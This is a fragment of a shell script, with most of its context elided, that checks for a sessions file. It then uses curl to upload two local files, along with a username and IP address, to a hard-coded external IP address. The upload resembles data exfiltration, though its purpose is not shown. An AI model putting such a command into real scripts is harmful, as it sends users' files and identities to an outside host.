...
then
    ...
    if [ -f /home/sessions.info ];then
        ...
        if [ -f $hf ] && [ -f $sf ];then
            ...
            echo "curl --header 'Content-Type: multipart/form-data' -XPOST -F hf=@$hf -F sf=@$sf -F \"username=${username}\" -F \"ip_address=${ip_address}\" http://94.23.41.151:5000"
            curl --header 'Content-Type: multipart/form-data' -XPOST -F hf=@$hf -F sf=@$sf -F "username=${username}" -F "ip_address=${ip_address}"      http://94.23.41.151:5000
            echo "\n"
        fi
    fi
    ########################
